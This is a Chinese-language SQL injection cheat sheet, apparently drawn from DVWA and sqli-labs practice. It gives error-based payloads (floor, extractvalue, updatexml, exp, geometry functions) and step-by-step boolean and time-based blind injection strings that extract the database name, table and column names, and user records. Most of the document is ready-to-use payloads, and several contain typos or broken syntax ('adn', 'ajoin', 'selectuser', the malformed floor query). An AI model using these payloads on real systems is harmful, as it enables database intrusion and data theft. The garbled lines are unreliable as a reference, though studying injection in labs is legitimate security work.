## 增删改查

1、功能：数据查询

查询：SELECT * FROM news where id=$id

2、功能：新增用户，添加新闻等

增加：INSERT INTO news (字段名) VALUES (数据)

3、功能：删除用户，删除新闻等

删除：DELETE FROM news WHERE id=$id

4、功能：修改用户，修改文章等

修改：UPDATE news SET id=$id

## 布尔&报错&延迟

### 布尔注入

#### floor

```
id=1' and select 1 from (select count(),concat(database(),floor(rand(0)2)x from information_schema.tables group by x)a)
```

#### extractvalue

```
id=1' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables limit 1)))
```

#### updatexml

```
and 1=(updatexml(1,concat(0x3a,(select user())),1))
```

#### NAME_CONST

```
and exists(select_from (select_from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
```

#### join

```
select * from(select * from mysql.user ajoin mysql.user b)c;
```

#### exp

```
and exp(~(select * from (select user () ) a) );
```

#### GeometryCollection

```
and GeometryCollection(()select *from(select user () )a)b );
```

#### polygon

```
and polygon (()select * from(select user ())a)b );
```

#### multipoint

```
and multipoint (()select * from(select user() )a)b );
```

#### multlinestring

```
and multlinestring (()select * from(selectuser () )a)b );
```

#### multpolygon

```
and multpolygon (()select * from(selectuser () )a)b );
```
#### linestring

```
and linestring (()select * from(select user() )a)b );
```

### 布尔盲注

```
1.判断当前数据库名长度与数据库名称  
and select length(database())>n  //判断数据库名长度  
and ascii(substr(database(),m,1))>n //截取数据库名第m个字符并转换成ascii码 判断具体值

2.判断数据库的表长度与表名

and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))>n  //判断第一行表名的长度

and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),m,1))>n  //截取第一行表名的第m个字符串转换为ascii值判断具体为多少  
3.判断数据库的字段名长度与字段名称

and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>n  //判断表名中字段名的长度

adn ascii((substr(select column_name from information_schema.columns where table_name='users' limit 0,1),m,1))>n //截取表中字段的第m字符串转换为ascii值，判断具体值

4.判断字段的内容长度与内容字符串  
and length((select user from users limit 0,1)) >1 //判断字符串内容长度

and ascii(substr((select user from users limit 0,1),m,1)) //截取第m个字符串转换为ascii值
```

### 时间盲注

```
**枚举当前数据库名  
**-    id =1' and sleep(3) and ascii(substr(database(),m,1))>n --+**  
**

**枚举当前数据库的表名**

****-    id =1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1))>n and sleep(3) --+****

或者利用if函数  
**-     id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1)) >n,sleep(5),1) --+**

**枚举当前数据库表的字段名**

****-    id =1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit a,1),m,1))>n and sleep(3) --+****

**枚举每个字段对应的数据项内容**

**-    id =1' and ascii(substr((select username from security.users limit a,1),m,1))>n and sleep(3) --+**
```

### 参考链接

[https://www.jianshu.com/p/bc35f8dd4f7c](https://www.jianshu.com/p/bc35f8dd4f7c)

https://www.cnblogs.com/impulse-/p/14227189.html

https://blog.csdn.net/dreamthe/article/details/123795302
